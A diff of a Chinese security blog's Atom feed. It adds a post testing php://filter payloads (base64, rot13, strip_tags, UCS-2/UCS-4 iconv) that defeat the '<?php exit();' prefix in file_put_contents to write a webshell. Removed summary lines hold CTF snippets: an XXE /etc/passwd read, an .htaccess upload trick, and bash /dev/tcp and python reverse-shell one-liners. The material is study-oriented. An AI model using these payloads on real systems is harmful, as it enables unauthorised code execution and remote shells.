@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-04-03T09:10:16.720Z</updated>
+  <updated>2020-04-03T09:17:07.474Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,23 +21,19 @@
     <link href="http://yoursite.com/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/"/>
     <id>http://yoursite.com/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</id>
     <published>2020-04-03T06:16:42.000Z</published>
-    <updated>2020-04-03T09:10:16.720Z</updated>
+    <updated>2020-04-03T09:17:07.474Z</updated>
     
     <content type="html"><![CDATA[<p>昨天看了篇文章<a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">一次“SSRF–&gt;RCE”的艰难利用</a>，被里面的各种骚操作给秀到了，发现<code>file_put_contents</code>这个很有意思，绕过<code>&lt;?php exit();</code>GetShell也经常有人提出不同的思路，这里简单的做一下测试的记录。</p><h1 id="file-put-contents-filename-”-lt-php-exit-”-content"><a href="#file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="file_put_contents($filename,”&lt;?php exit();”.$content);"></a>file_put_contents($filename,”&lt;?php exit();”.$content);</h1><blockquote><p><strong>前提</strong>：这种是前后两个变量不同，假设$filename,%content我们都可控情况</p></blockquote><p>这种情况相对较为简单，先捋清思路，$filename控制的写入的文件名，$content拼接在了<code>&lt;?php exit();</code>后，所以想要GetShell的话，就必须把<code>&lt;?php exit();</code>给干掉，而都知道$filename是控制文件名的，如果我们使用<strong>php://filter</strong>协议的话，这会先按<strong>php://filter</strong>规定的协议对$content进行解码后再写入协议，更强大的是<strong>php://filter</strong>还支持使用多个过滤器规则，也就是说我们可以来个连环操作。所以思路很简单，目标就是把<code>&lt;?php exit();</code>解码为php不认识的字符，而我们构造的内容能够正常的解码出来就可以。这个在phith0n之前的文章里有了很详细的介绍<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">传送门</a>，这里简单的介绍一下</p><h2 id="0x01-Base64编码"><a href="#0x01-Base64编码" class="headerlink" title="0x01 Base64编码"></a>0x01 Base64编码</h2><p>最常用的就是base64编码了，通过解码把<code>&lt;?php exit();</code>解码为乱码，而后面我们传入的webshell的base64内容被正常解码，就可以直接干掉<code>&lt;?php exit();</code>得到一个shell了,不过由于<code>&lt;?php exit();</code>中只有phpexit参与了解码，由于base64解码时4转3,所以需要补一位如👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt; aPD9waHAgcGhwaW5mbygpOz8+ -&gt; $content</span><br><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=Cyc1e.php  -&gt; $filename</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151021554.png" alt></p><h2 id="0x02-Rot13编码"><a href="#0x02-Rot13编码" class="headerlink" title="0x02 Rot13编码"></a>0x02 Rot13编码</h2><p>同样，也可以利用rot13编码来绕过，原理和Base64编码是一样的，就不多赘述了，如下👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; <span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span> -&gt; $content</span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151425262.png" alt></p><p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p><h2 id="0x03-组合拳"><a href="#0x03-组合拳" class="headerlink" title="0x03 组合拳"></a>0x03 组合拳</h2><p>我们可以利用<strong>php://filter</strong>字符串处理方法&amp;&amp;编码的方法绕过<code>&lt;?php exit();</code>，相对于直接编码就有点多此一举了，不过知道有这个方法就好了，例如利用strip_tags方法来直接去除xml，而我们传入的shell是base64编码过的，所以不会被去除，再解码即可，前面也说了<strong>php://filter</strong>是支持使用多个多滤器的，所以构造如下👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt;<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOz8+ -&gt; $content <span class="comment">#这里由于`&lt;?php exit();`不是完整的标签，所以需要补上’?&gt;‘进行补全</span></span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.strip_tags|<span class="built_in">convert</span>.base64-decode/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403152859574.png" alt></p><h1 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a>file_put_contents($a,”&lt;?php exit();”.$a);</h1><blockquote><p><strong>前提</strong>：这种是前后两个变量相同，假设$a可控情况</p></blockquote><p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些，这里也简单记录下测试的内容👇</p><h2 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h2><p>这里和上面对应上，不过经过个人测试，Base64的方式是<strong>不行的</strong>！（如果有构造出来的，分享一下），接下来讲讲为何个人觉得不行 ~</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">a</span>,<span class="string">"&lt;?php exit();"</span>.$<span class="params">a</span>)</span>;</span><br></pre></td></tr></table></figure><p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用<strong>php://filter</strong>来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可，而Base64构造的话，例如</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p>构造的shell可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是<strong>“很完美”</strong>的，我们看下base-decode哪些字符👇</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php<span class="regexp">//</span>filter<span class="regexp">/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/</span>resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p>而默认情况下base64编码是以 <strong>=</strong> 作为结尾的，所以正常解码的时候到了 = 就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 = 过不掉，所以导致过滤器解码失败，从而报错（不过还是会创建文件的，内容由于解码过程出错了，就都丢弃了）👇</p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160120749.png" alt></p><p>我们也可以简单的测试一下是否是 <strong>=</strong> 出的问题，</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$filename=<span class="string">"php://filter/write=convert.base64-decode/resource=Cyc1e.php"</span>;</span><br><span class="line">$content=<span class="string">"PD9waHAgcGhwaW5mbygpOz8+"</span>;</span><br><span class="line">file_put_contents($filename,<span class="string">"&lt;?PHP exit();//="</span>.$content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160208500.png" alt></p><p>结果是一样的，所以可以确定是 <strong>=</strong> 出的问题，要是有绕过的构造方法，欢迎分享。</p><h2 id="0x02-Rot13"><a href="#0x02-Rot13" class="headerlink" title="0x02 Rot13"></a>0x02 Rot13</h2><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13|<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt></p><p>和前面提到的一样，这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p><h2 id="0x03-iconv字符编码转换"><a href="#0x03-iconv字符编码转换" class="headerlink" title="0x03 iconv字符编码转换"></a>0x03 iconv字符编码转换</h2><p>这种方法由于之前没有见过，所以感觉这波操作比我的亚索还要秀~，想法是一样的，通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式，而我们构造的转成可正常解析的。👇</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo iconv(<span class="string">"UCS-2LE"</span>,<span class="string">"UCS-2BE"</span>,'&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;hp phpipfn(<span class="name">o</span><span class="comment">;)&gt;?</span></span><br></pre></td></tr></table></figure><p>这里用的是UCS-2，当然我们也可以用UCS-4👇</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(<span class="string">"UCS-4LE"</span>,<span class="string">"UCS-4BE"</span>,'aa&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;aa phpiphp(<span class="name">ofn&gt;</span>?<span class="comment">;)</span></span><br></pre></td></tr></table></figure><p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload👇</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line">**<span class="literal">or</span>**</span><br><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line"><span class="meta">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?<span class="comment">;)之前字符个数是4的倍数，所以需要补3个字符</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162535114.png" alt></p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162950176.png" alt></p><p>当然这种方法对于前后不同变量也是一样适用的<del>~</del></p><h2 id="0x04-组合拳"><a href="#0x04-组合拳" class="headerlink" title="0x04 组合拳"></a>0x04 组合拳</h2><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，只是不要和base64编码进行组合就好了，原因前面描述过了，就不赘述，这里就用UCS-2和rot13举一个例子吧👇</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="attr">a</span> = 'php://filter/<span class="attr">write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc</span> cucvcsa(b;)&gt;?/<span class="attr">resource=Cyc1e.php';</span> <span class="comment">#同样需要补位，这里补了一个x</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403165229869.png" alt></p><p>为何不用string.strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，这里需要找其他的编码方式进行构造，这里做个小tips，由于strip_tags去除的是一个闭合的标签所以<code>?&gt;</code>可以放在我们构造的shell编码前，这样在contents上就直接把shell前的字符去了，只要shell的编码不会被删除，就可以解码回shell写入文件中，本菜懒，就不一个一个过滤器试了<del>~</del></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的记录了一下本菜的测试过程，过滤器只用了提到的和常用的，当然<strong>php://filter</strong>还有其他的过滤器是可以用的，不过总结起来说，思路都是一样的，就是如何把<code>&lt;?php exit();</code>给<strong>”吃掉“</strong>，让自己构造的shell可以正常运行，简单总结了这种方法，当然，方法万千，师傅们有好的方法也欢迎分享（白嫖）<del>~</del></p><p>tips：<code>file_put_contents</code>和<code>file_get_contents</code>这两个函数还是很有意思的，file_get_contents也有很多特性，下次有时间再写</p>]]></content>
     
     <summary type="html">
     
-      昨天看了篇文章一次“SSRF–&gt;RCE”的艰难利用，被里面的各种骚操作给秀到了，发现file_put_contents这个很有意思，绕过php exit();GetShell也经常有人提出不同的思路，这里简单的做一下测试的记录。
-
-file_put_contents($filename,”&lt;?php exit();”.$content);
-前提：这种是前后两个变量不同，假设$filename,%content我们都可控情况
-
-这种情况相对较为简单，先捋清思路，$filename控制的写入的文件名，$content拼接在了&lt;?php exit();后，所以想要GetShell的话，就必须把&lt;
+      &lt;p&gt;昨天看了篇文章&lt;a href=&quot;https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一次“SSRF–&amp;gt;RCE”的艰难利用&lt;/a&gt;，被里面的各种骚操作给秀到了，发现&lt;code&gt;file_put_contents&lt;/code&gt;这个很有意思，绕过&lt;code&gt;&amp;lt;?php exit();&lt;/code&gt;GetShell也经常有人提出不同的思路，这里简单的做一下测试的记录。&lt;/p&gt;
+&lt;h1 id=&quot;file-put-contents-filename-”-lt-php-exit-”-content&quot;&gt;&lt;a href=&quot;#file-put-contents-filename-”-lt-php-exit-”-content&quot; class=&quot;headerlink&quot; title=&quot;file_put_contents($filename,”&amp;lt;?php exit();”.$content);&quot;&gt;&lt;/a&gt;file_put_contents($filename,”&amp;lt;?php exit();”.$content);&lt;/h1&gt;
     
     </summary>
     
     
-      <category term="水滴随笔" scheme="http://yoursite.com/categories/%E6%B0%B4%E6%BB%B4%E9%9A%8F%E7%AC%94/"/>
+      <category term="Cyc1e的漏洞分析之路" scheme="http://yoursite.com/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/"/>
     
     
       <category term="file_put_contents" scheme="http://yoursite.com/tags/file-put-contents/"/>
@@ -57,81 +53,8 @@ file_put_contents($filename,”&lt;?php exit();”.$content);
     
     <summary type="html">
     
-      很长一段时间没有接触了，都沉迷于课程学习不能自拔（被迫的），果然2020年对题目都失去了感觉，不仅如此，刚打开就想x了……，简单先整理一下做出来的题。
-
-0x00 Webtmp
-题目源码
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-53
-54
-55
-56
-57
-58
-59
-60
-61
-62
-63
-64
-65
-66
-67
-
-
-import base
+      &lt;p&gt;&lt;strong&gt;很长一段时间没有接触了，都沉迷于课程学习不能自拔（被迫的），果然2020年对题目都失去了感觉，不仅如此，刚打开就想x了……，简单先整理一下做出来的题。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x00-Webtmp&quot;&gt;&lt;a href=&quot;#0x00-Webtmp&quot; class=&quot;headerlink&quot; title=&quot;0x00 Webtmp&quot;&gt;&lt;/a&gt;0x00 Webtmp&lt;/h3&gt;
     
     </summary>
     
@@ -154,25 +77,7 @@ import base
     
     <summary type="html">
     
-      固件下载
-我是到官网的查询下载的，下载地址：http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L
-也可以直接到ftp服务器上下载：ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP
-
-固件解压
-下载的bin文件利用binwalk进行解压
-
-1
-
-
-binwalk -Me DIR850L_FW113WWb01_f4if.bin
-
-
-起文件系统的路径为
-
-1
-
-
-/_DIR850L_FW113WWb01_f4if.bin.ext
+      &lt;h1 id=&quot;固件下载&quot;&gt;&lt;a href=&quot;#固件下载&quot; class=&quot;headerlink&quot; title=&quot;固件下载&quot;&gt;&lt;/a&gt;固件下载&lt;/h1&gt;&lt;p&gt;我是到官网的查询下载的，下载地址：&lt;a href=&quot;http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-850L&lt;/a&gt;&lt;br&gt;也可以直接到ftp服务器上下载：&lt;a href=&quot;ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ftp://ftp2.dlink.com/PRODUCTS/DIR-850L/REVA/DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP&lt;/a&gt;&lt;/p&gt;
     
     </summary>
     
@@ -197,27 +102,8 @@ binwalk -Me DIR850L_FW113WWb01_f4if.bin
     
     <summary type="html">
     
-      很久没有打攻防赛了，致力于写出Perfect文件监控脚本我在这次比赛翻车了，服务器没有pytyon2环境，所以回来更新成了python3了，旅游队伍意外拿了个季军，总的来说赞一下这次比赛，体验还是不错的，小小总结一下决赛的Web（场上弟弟，赛后分析，不会java，漏洞也肯定没找全，欢迎师傅贴个文章学习一波）python和php题目源码下载地址：https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ 提取码: 1jpa
-
-0x01 mOtrix
-一道python题，这里贴下源码
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
+      &lt;p&gt;&lt;strong&gt;很久没有打攻防赛了，致力于写出Perfect文件监控脚本我在这次比赛翻车了，服务器没有pytyon2环境，所以回来更新成了python3了，旅游队伍意外拿了个季军，总的来说赞一下这次比赛，体验还是不错的，小小总结一下决赛的Web（场上弟弟，赛后分析，不会java，漏洞也肯定没找全，欢迎师傅贴个文章学习一波）python和php题目源码下载地址：&lt;a href=&quot;https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ&lt;/a&gt; 提取码: 1jpa&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x01-mOtrix&quot;&gt;&lt;a href=&quot;#0x01-mOtrix&quot; class=&quot;headerlink&quot; title=&quot;0x01 mOtrix&quot;&gt;&lt;/a&gt;0x01 mOtrix&lt;/h2&gt;
     
     </summary>
     
@@ -244,24 +130,8 @@ binwalk -Me DIR850L_FW113WWb01_f4if.bin
     
     <summary type="html">
     
-      Ogeek和XNUCA有一天重了，第一天被卡在XNUCA，EZphp转这（https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力……
-
-0x01 LookAround
-右键查看网页源码可以看到加载了一个/js/_.js，查看内容阔以看到向callback发送了个请求
-
-
-
-请求方式是发送xml数据，所以判断为是一个XEE漏洞，不过利用参见的XXE payload打不通，只能够判断系统文件是否存在，
-
-1
-2
-3
-4
-5
-
-
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-DOCTYPE te
+      &lt;p&gt;&lt;strong&gt;Ogeek和XNUCA有一天重了，第一天被卡在XNUCA，EZphp转这（&lt;a href=&quot;https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/1875219503fd）上，心态有点受不了，所以Ogeek没什么战斗力&lt;/a&gt;……&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x01-LookAround&quot;&gt;&lt;a href=&quot;#0x01-LookAround&quot; class=&quot;headerlink&quot; title=&quot;0x01 LookAround&quot;&gt;&lt;/a&gt;0x01 LookAround&lt;/h3&gt;
     
     </summary>
     
@@ -292,54 +162,8 @@ DOCTYPE te
     
     <summary type="html">
     
-      这次不是滑水，是被难住了，时间都花在了Ezphp上，简单纪录一下
-
-首先贴一下题目源码：
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-
-
-#index.php 
-php
-    $files = scandir(&#39;./&#39;); 
-    foreach($files as $file) {
-        if(is_file($file)){
-            if ($file !== &quot;index.php&quot;) {
-         
+      &lt;p&gt;&lt;strong&gt;这次不是滑水，是被难住了，时间都花在了Ezphp上，简单纪录一下&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;首先贴一下题目源码：&lt;/p&gt;
     
     </summary>
     
@@ -362,21 +186,8 @@ php
     
     <summary type="html">
     
-      这次比赛滑水了，只有中午和晚上有时间看题，都是大佬们带着飞的，记录下部分Web的解题思路
-
-0x01 CheckIn
-这题在国赛的华东北区半决赛出现过，当时的服务器环境是apache + php，所以解法是上传.htaccess和里面用base64协议来解析上传的马。
-
-1
-2
-3
-4
-
-
-#.htacess
-\x00\x00\x8a\x39\x8a\x39     #用来绕过文件头检测
-AddType application/x-httpd-php .jpg
-php_value auto_append_file &quot;php://filter/convert.base64-decode/reso
+      &lt;p&gt;&lt;strong&gt;这次比赛滑水了，只有中午和晚上有时间看题，都是大佬们带着飞的，记录下部分Web的解题思路&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x01-CheckIn&quot;&gt;&lt;a href=&quot;#0x01-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;0x01 CheckIn&quot;&gt;&lt;/a&gt;0x01 CheckIn&lt;/h3&gt;
     
     </summary>
     
@@ -403,43 +214,7 @@ php_value auto_append_file &quot;php://filter/convert.base64-decode/reso
     
     <summary type="html">
     
-      0x01 Game
-这题迷得很，查看下一下js，按着ajax发送请求得条件自己发一个请求就好了
-
-
-
-payload:
-
-1
-2
-
-
-/socre.php
-POST:score=15
-
-
-0x02 who_are_you
-XXE的题目，没有任何限制，直接任意文件读取……
-
-1
-2
-3
-4
-5
-6
-7
-
-
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE xxe [
-&lt;!ELEMENT name ANY&gt; 
-&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
-&lt;root&gt;
-&lt;name&gt;&amp;xxe;&lt;/name&gt;
-&lt;/root&gt;
-
-
-可以读到pas
+      &lt;h3 id=&quot;0x01-Game&quot;&gt;&lt;a href=&quot;#0x01-Game&quot; class=&quot;headerlink&quot; title=&quot;0x01 Game&quot;&gt;&lt;/a&gt;0x01 Game&lt;/h3&gt;&lt;p&gt;这题迷得很，查看下一下js，按着ajax发送请求得条件自己发一个请求就好了&lt;/p&gt;
     
     </summary>
     
@@ -464,34 +239,7 @@ XXE的题目，没有任何限制，直接任意文件读取……
     
     <summary type="html">
     
-      0x01 SSRF ME
-这题没什么难度，就不多说了，根据代码逻辑构造hash拓展攻击，坑的就是找flag找了半天，找到了然后放提示了……直接贴代码
-
-1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-
-
-# -*- coding: utf-8 -*-
-import requests
-import hashpumpy
-import urllib.parse as change
-
-readfile = &#39;flag.txt&#39;
-url1 =  &#39;http://139.180.128.86/geneSign?param=&#39; + readfile
-req = requests.ge
+      &lt;h3 id=&quot;0x01-SSRF-ME&quot;&gt;&lt;a href=&quot;#0x01-SSRF-ME&quot; class=&quot;headerlink&quot; title=&quot;0x01 SSRF ME&quot;&gt;&lt;/a&gt;0x01 SSRF ME&lt;/h3&gt;&lt;p&gt;这题没什么难度，就不多说了，根据代码逻辑构造hash拓展攻击，坑的就是找flag找了半天，找到了然后放提示了……直接贴代码&lt;/p&gt;
     
     </summary>
     
@@ -518,15 +266,8 @@ req = requests.ge
     
     <summary type="html">
     
-      最近新换了电脑，装环境真的装到了自闭，老电脑装的是python2环境，没有装python3，新电脑打算两个环境都装上，让两个版本以及pip同时可用，这里简单记录下
-
-0x01 下载地址
-https://www.python.org/downloads/，分别下载python2和python3即可
-
-0x02 环境变量
-修改python2文件夹中python.exe和pythonw.exe分别为python2.exe和pythonw2.exe；
-修改python3文件夹中python.exe和pythonw.exe分别为python3.exe和pythonw3.exe
-（注：方便用的话修改其中一
+      &lt;p&gt;&lt;strong&gt;最近新换了电脑，装环境真的装到了自闭，老电脑装的是python2环境，没有装python3，新电脑打算两个环境都装上，让两个版本以及pip同时可用，这里简单记录下&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&quot;0x01-下载地址&quot;&gt;&lt;a href=&quot;#0x01-下载地址&quot; class=&quot;headerlink&quot; title=&quot;0x01 下载地址&quot;&gt;&lt;/a&gt;0x01 下载地址&lt;/h3&gt;
     
     </summary>
     
@@ -549,31 +290,8 @@ https://www.python.org/downloads/，分别下载python2和python3即可
     
     <summary type="html">
     
-      写简单些给自己用的，省得每次记不住都得靠度娘
-接收端主机利用nc监听端口
-
-1
-2
-
-
-Windows：nc -l -v -p 8888
-Linux：nc -lvvp 8888
-
-
-放个nc: https://pan.baidu.com/s/1B0jehdcst5aYR0HLbXSM9w 提取码: 9vya
-
-0x01 bash
-1
-
-
-bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1
-
-
-0x02 python
-1
-
-
-python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SO
+      &lt;p&gt;&lt;strong&gt;写简单些给自己用的，省得每次记不住都得靠度娘&lt;/strong&gt;&lt;br&gt;接收端主机利用nc监听端口&lt;/p&gt;
+&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Windows：nc -l -v -p &lt;span class=&quot;number&quot;&gt;8888&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Linux：nc -lvvp &lt;span class=&quot;number&quot;&gt;8888&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
     
     </summary>
     
@@ -598,63 +316,8 @@ python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socke
     
     <summary type="html">
     
